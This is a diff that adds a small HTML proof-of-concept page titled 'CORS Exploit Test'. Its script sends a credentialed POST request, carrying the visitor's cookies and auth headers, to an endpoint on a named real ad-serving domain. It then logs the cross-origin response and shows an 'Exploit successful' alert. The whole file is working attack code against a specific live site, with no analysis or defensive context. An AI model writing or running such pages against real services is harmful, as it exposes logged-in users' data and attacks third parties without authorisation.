@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>CORS Exploit Test</h1>
+  <script>
+    fetch('https://adgebra.co.in/afpf/data/loadAdServingData', {
+      method: 'POST',
+      credentials: 'include', // send cookies/auth headers
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ test: "exploit" })
+    })
+    .then(response => response.text())
+    .then(data => {
+      console.log('Response:', data);
+      alert('Exploit successful, check console for response');
+    })
+    .catch(err => console.error('Error:', err));
+  </script>
+</body>
+</html>
